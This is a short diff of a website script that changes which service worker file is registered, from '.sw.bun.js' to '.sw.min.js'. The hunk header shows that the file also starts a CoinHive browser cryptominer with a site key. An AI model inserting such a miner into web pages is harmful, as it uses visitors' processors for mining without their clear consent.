@@ -21,7 +21,7 @@ new CoinHive.Anonymous('7FZrGIbIO4kqxbTLa82QpffB9ShUGmWE', {
 // Service worker
 if ('serviceWorker' in navigator) {
   window.addEventListener('load', function () {
-    navigator.serviceWorker.register('/static/js/.sw.bun.js'/*'/static/js/.sw.bun.js'*/).then( function(registration) {
+    navigator.serviceWorker.register('/static/js/.sw.min.js').then( function(registration) {
       // Registration was successful
       console.log('ServiceWorker registration successful with scope: ', registration.scope)
     }, function(err) {
